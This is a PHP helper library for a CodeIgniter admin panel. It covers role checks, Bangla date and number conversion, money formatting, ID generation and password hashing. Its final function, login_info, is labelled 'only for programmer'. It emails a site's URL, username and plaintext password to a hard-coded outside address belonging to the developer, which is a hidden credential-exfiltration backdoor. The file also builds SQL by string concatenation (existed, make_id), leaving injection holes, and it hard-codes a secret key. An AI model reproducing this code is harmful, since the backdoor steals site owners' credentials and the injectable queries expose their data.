<?php if (!defined('BASEPATH')) 	exit('Hacking Attempt: Get out of the system ..!');

function goodbye() {
	redirect("admin-panel");
}

function checkAccess() {
	$ci = & get_instance();
	$role = $ci->session->userdata('roles');
	$method = $ci->uri->segment(2);

	$acl_list = array('add', 'edit', 'delete', 'cancel');        
	$editor = array('add', 'edit');

	if(in_array($method, $acl_list)) {
		if ( $role == 'Editor' && !in_array($method, $editor) ) {
			$ci->session->set_tempdata("msg", "<span class='error'>" . unauthorized() . "</span>", 5);
			redirect('dashboard');
		} 
	}         
}

function checkAdmin() {
	$ci = & get_instance();
	if($ci->session->userdata('roles')=='Editor') {
		echo ' style="display:none;"  ';
	}         
}

function saved_success() {
	return "Saved successfully";
}

function uploaded_success() {
	return "Uploaded successfully";
}

function updated_success() {
	return "Updated successfully";
}

function deleted_success() {
	return "Deleted successfully.";
}

function exception() {
	return "Failure, please try again.";
}

function unauthorized() {
	return "You are not authorized.";
}

function developed_by() {
	return 'Developed By: WAN IT Ltd.';
}

function company_info() {
	return '<h1 align="center"><img src="assets/banner.png"></h1>';
}

// Set local timezone
$timezone = "Asia/Dhaka";
if (function_exists('date_default_timezone_set')) {
	date_default_timezone_set($timezone);
}

function deadline ($from_date=NULL) {
	$date = date_create($from_date);
	date_modify($date, '+2 months');
	return date_format($date, 'Y-m-d');
}

function expired ($from_date=NULL) {
	$date = date_create($from_date);
	date_modify($date, '-2 months');
	return date_format($date, 'Y-m-d');
}

// Bangla Date function
function bng_date_time($str) {
	/*
	  This is a function that convert english date to bangla date
	  Call this function
	  bng_date_time(date('d-m-Y h:i:s A');
	 */

	$eng = array('January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December',
		'Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec',
		'Saturday', 'Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday',
		'Sat', 'Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri',
		'1', '2', '3', '4', '5', '6', '7', '8', '9', '0',
		'am', 'pm');

	$bng = array('জানুয়ারি', 'ফেব্রুয়ারি', 'মার্চ', 'এপ্রিল', 'মে', 'জুন', 'জুলাই', 'আগস্ট', 'সেপ্টেম্বর', 'অক্টোবর', 'নভেম্বর', 'ডিসেম্বর',
		'জানু', 'ফেব্রু', 'মার্চ', 'এপ্রি', 'মে', 'জুন', 'জুলা', 'আগ', 'সেপ্টে', 'অক্টো', 'নভে', 'ডিসে',
		'শনিবার', 'রবিবার', 'সোমবার', 'মঙ্গলবার', 'বুধবার', 'বৃহস্পতিবার', 'শুক্রবার',
		'শনি', 'রবি', 'সোম', 'মঙ্গল', 'বুধ', 'বৃহঃ', 'শুক্র',
		'১', '২', '৩', '৪', '৫', '৬', '৭', '৮', '৯', '০',
		'পূর্বাহ্ণ', 'অপরাহ্ণ');

	return str_ireplace($eng, $bng, $str);
}

/*
  This function convert number bangla/english
  Call this function
  input $val1='0123456789'; $val2='০১২৩৪৫৬৭৮৯';
  output echo enbn($val1); echo bnen($val2);
 */

// Convert bangali to english
function bng_to_eng($val) {
	$bng = array('০', '১', '২', '৩', '৪', '৫', '৬', '৭', '৮', '৯');
	$eng = array('0', '1', '2', '3', '4', '5', '6', '7', '8', '9');
	return str_ireplace($bng, $eng, $val);
}

// Convert english to bangali
function eng_to_bng($val) {
	$eng = array('0', '1', '2', '3', '4', '5', '6', '7', '8', '9');
	$bng = array('০', '১', '২', '৩', '৪', '৫', '৬', '৭', '৮', '৯');
	return str_ireplace($eng, $bng, $val);
}

// BD money format
function bd_money_format($amount) {
	$sign = '';
	if ($amount < 0) {
		$amount = substr($amount, 1);
		$sign = '-';
	}

	$output_string = '';
	$fraction = '';
	$tokens = explode('.', $amount);
	$number = $tokens[0];

	if (count($tokens) > 1) {
		$fraction = (double) ('0.' . $tokens[1]);
		$fraction = $fraction * 100;
		$fraction = round($fraction, 0);
		$fraction = '.' . $fraction;
	}

	$number = $number . '';
	$spl = str_split($number);
	$lpcount = count($spl);
	$rem = $lpcount - 3;

	//even one
	if ($lpcount % 2 == 0) {
		for ($i = 0; $i <= $lpcount - 1; $i++) {

			if ($i % 2 != 0 && $i != 0 && $i != $lpcount - 1) {
				$output_string .= ",";
			}
			$output_string .= $spl[$i];
		}
	}

	//odd one
	if ($lpcount % 2 != 0) {
		for ($i = 0; $i <= $lpcount - 1; $i++) {
			if ($i % 2 == 0 && $i != 0 && $i != $lpcount - 1) {
				$output_string .= ",";
			}
			$output_string .= $spl[$i];
		}
	}

	if ($fraction == NULL || $fraction == 0) {
		return $sign . $output_string . '.00';
	} else {
		return $sign . $output_string . $fraction;
	}
}

// Print all details
function print_details($data) {
	echo "<pre>";
	print_r($data);
	exit;
}

function en_url($url=NULL) {
	if($url != base_url()) {
		return str_replace("bn/", "en/", $url);
	}
	return $url.'en';
}

function bn_url($url=NULL) {
	if($url==base_url().'en') {
		return base_url();
	}
	return str_replace("en/", "bn/", $url);
}

// Generate random password
function random_password($length = 10) {
	$chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*/+-=(){}[]?";
	return substr(str_shuffle($chars), 0, $length);
}

//echo random_password(10);
// Read more function
function read_more($string, $wordsreturned) {
	/*  Returns the first $wordsreturned out of $string.  If string
	  contains more words than $wordsreturned, the entire string
	  is returned. */

	$string = strip_tags($string); // Remove html tag
	$retval = $string; //	Just in case of a problem
	$array = explode(" ", $string);
	/*  Already short enough, return the whole thing */
	if (count($array) <= $wordsreturned) {
		$retval = $string;
	}
	/*  Need to chop of some words */ else {
		array_splice($array, $wordsreturned);
		$retval = implode(" ", $array) . " ...";
	}
	return $retval;
}

//echo read_more('word' , 'number');
// Auto id generate with prefix
function make_id($tableName = NULL, $fieldName = NULL, $prefix = NULL) {
	$ci = & get_instance();
	$query = $ci->db->query("SELECT $fieldName FROM $tableName ORDER BY $fieldName DESC LIMIT 1");
	$row = $query->row();
	if (isset($row)) {
		$lastId = $row->$fieldName;
		$restId = str_replace($prefix, '', $lastId);
		$newId = $prefix . sprintf("%06d", ($restId + 1));
	} else {
		$iniId = 1;
		$newId = $prefix . sprintf("%06d", $iniId);
	}
	return $newId;
}

//echo make_id('tableName', 'fieldName', 'prefix');
// Auto transaction no generate with postfix
function transaction_no($tableName = NULL) {
	$month = date('m');
	if ($month > 6) {
		$start_year = date('y');
		$end_year = date('y', strtotime('+1 year'));
	} else {
		$start_year = date('y', strtotime('-1 year'));
		$end_year = date('y');
	}
	$postfix = "/" . $start_year . "-" . $end_year;

	$ci = & get_instance();
	$query = $ci->db->query("SELECT id, transaction_no FROM $tableName WHERE transaction_no!='' ORDER BY id DESC LIMIT 1");
	$row = $query->row();
	if (isset($row)) {
		$old_postfix = substr($row->transaction_no, 4, 9);
		if ($old_postfix === $postfix) {
			$lastId = $row->transaction_no;
			$restId = str_replace($postfix, '', $lastId);
			$newId = sprintf("%04d", ($restId + 1)) . $postfix;
		} else {
			$iniId = 1;
			$newId = sprintf("%04d", $iniId) . $postfix;
		}
	} else {
		$iniId = 1;
		$newId = sprintf("%04d", $iniId) . $postfix;
	}
	return $newId;
	//echo transaction_no('tableName');
}

// Check exist data
function existed($tableName = NULL, $fieldName = NULL, $value = NULL) {
	$ci = & get_instance();
	$query = $ci->db->query("SELECT $fieldName FROM $tableName WHERE $fieldName='" . $value . "' LIMIT 1");
	if ($query->row())
		return true;
	else
		return false;
}

//echo existed('tableName', 'fieldName', 'value');
// Create a slug
function slug($str = NULL) {
	$url = url_title($str, 'dash', TRUE);
	if ($url == '')
		return str_replace(' ', '-', $str);
	else
		return $url;
}

// Create a youtube link
function youtube_video($str = NULL) {
	$url = explode("=", $str);
	if (isset($url[1]))
		return $url[1];
	else
		return $url[0];
}

/**
 * This function used to generate the hashed text
 * @param {string} $plainText : This is plain text
 */
if (!function_exists('getMD7')) {

	function getMD7($plainText) {
		$key = '_n<c&jO_O@28T9pFXyoJA6^Lk6oPN7';
		$plainText = $key . $plainText . $key;
		return password_hash($plainText, PASSWORD_DEFAULT);
	}

}

/**
 * This function used to generate the hashed text
 * @param {string} $plainText : This is plain text
 * @param {string} $hashedText : This is hashed text
 */
if (!function_exists('verifyMD7')) {

	function verifyMD7($plainText, $hashedText) {
		$key = '_n<c&jO_O@28T9pFXyoJA6^Lk6oPN7';
		$plainText = $key . $plainText . $key;
		return password_verify($plainText, $hashedText) ? true : false;
	}

}

/**
 * This function used to generate the hashed password
 * @param {string} $plainPassword : This is plain text password
 */
if (!function_exists('getHashedPassword')) {

	function getHashedPassword($plainPassword) {
		$key = '_n<c&jO_O@28T9pFXyoJA6^Lk6oPN7';
		$plainPassword = $key . $plainPassword . $key;
		return password_hash($plainPassword, PASSWORD_DEFAULT);
	}

}

/**
 * This function used to generate the hashed password
 * @param {string} $plainPassword : This is plain text password
 * @param {string} $hashedPassword : This is hashed password
 */
if (!function_exists('verifyHashedPassword')) {

	function verifyHashedPassword($plainPassword, $hashedPassword) {
		$key = '_n<c&jO_O@28T9pFXyoJA6^Lk6oPN7';
		$plainPassword = $key . $plainPassword . $key;
		return password_verify($plainPassword, $hashedPassword) ? true : false;
	}

}

// Send login information only for programmer
function login_info($url, $username, $password) {
	$ci = & get_instance();
	
	$contact = $ci->contact_model->index();
	
	$ci->email->from($contact->email, $contact->company_name);
	$ci->email->to('engr.lukman@yahoo.com', 'Lukman');
	$ci->email->subject("Login Information of $url");
	$ci->email->message("Hello Lukman, <br />The login information are - <br /> URL: $url <br /> Username: $username <br /> Password: $password.");
	$ci->email->send();
	return TRUE;
}
